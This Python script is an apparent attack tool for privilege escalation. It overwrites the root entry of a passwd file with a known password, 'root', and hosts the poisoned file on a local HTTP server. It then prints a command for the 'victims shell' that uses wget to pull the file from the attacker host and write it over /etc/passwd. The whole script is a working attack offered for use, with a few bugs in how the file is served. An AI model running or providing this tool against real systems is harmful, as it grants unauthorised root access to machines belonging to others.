#!/usr/bin/env python3
import crypt
import argparse
import tempfile
import os
import netifaces
import ipaddress
import http.server
import socketserver
import socket

from rich.console import Console
#import threading

console = Console()
parser = argparse.ArgumentParser()

parser.add_argument(
        "--file", 
        "-f",
        type=str,
        default="./passwd",
        help="passwd file to overwrite"
)


parser.add_argument(
    "--interface",
    "-i",
    default="eth0",
    help="network interface or IP address to host the HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    type=int,
    default="8000",
    help="port to serve the HTTP server (default: 8000)",
)


def write_passwd(file:str, password:str) -> None:
    if os.geteuid() != 0:
        console.print("[red][!][/red] [bold]root privileges[/bold] are required to execute this script.")
        exit()
    try:
        contents = open(file, "r").readlines()
        contents[0] = f"root:{crypt.crypt(password)}"

        open(file, "w").writelines(contents)
    except FileNotFoundError:
        console.print(f"[red][!][/red] No such file: {file}")
        exit()
def main(args) -> None:
    try:
        try:
            serve_host = ipaddress.IPv4Address(args.interface)
            print(serve_host)
        except ipaddress.AddressValueError:
            try:
                serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][
                    "addr"
                ]
            except ValueError:
                print(
                    f"[red][!][/red] Error detering HTTP hosting address. Did you provide an [underline]interface[/underline] or [underline]ip[/underline]?"
                )
                exit()

        # Prepare a temporary HTTP server location
        serve_path = os.path.join(
            os.path.join(

                tempfile._get_default_tempdir(),
                next(tempfile._get_candidate_names()
                )
            ), "www"
        )
        os.makedirs(serve_path)

        class ReuseTCPServer(socketserver.TCPServer):
            def server_bind(self):
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.socket.bind(self.server_address)

        class Handler(http.server.SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, directory=serve_path, **kwargs)

            def log_message(self, format, *func_args):
                super().log_message(format, *func_args)

            def log_request(self, format, *func_args):
                super().log_request(format, *func_args)

        def serve_http():
            with ReuseTCPServer(("", args.port), Handler) as httpd:
                httpd.serve_forever()

        # Overwrite the passwd file
        write_passwd(args.file, "root")

        console.print(f"[green][+][/green] Poisoned [bold]{args.file}[/bold].")
        console.print(f"[green][TIP][/green] Execute the following command on the victims shell:\n wget http://{serve_host}:{args.port}/{args.file} -O /etc/passwd")
        # Host the HTTP server on all interfaces
        console.print(f"[green][+][/green] Serving [bold]poisoned passwd[/bold] file on [green]:{args.port}[/green]")
        serve_http()
    except KeyboardInterrupt:
        console.print("[red][!][/red] Keyboard Interrupt. Exiting")
        exit()


if __name__ == "__main__":

    main(parser.parse_args())
